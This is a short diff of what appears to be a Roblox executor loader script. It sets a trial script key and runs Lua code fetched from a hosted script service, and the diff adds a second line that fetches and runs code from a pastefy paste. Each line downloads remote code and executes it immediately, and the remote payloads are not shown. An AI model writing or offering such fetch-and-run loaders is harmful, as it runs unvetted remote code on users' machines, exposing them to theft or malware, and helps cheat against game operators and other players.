@@ -1,3 +1,5 @@
 script_key = "trial"
 
 loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/8a64235bd67f9e065f01c70fe851bfdc2288397fb4b211af0761fb435aebea72.lua"))()
+
+loadstring(game:HttpGet("https://pastefy.app/vE96XfPg/raw"))()
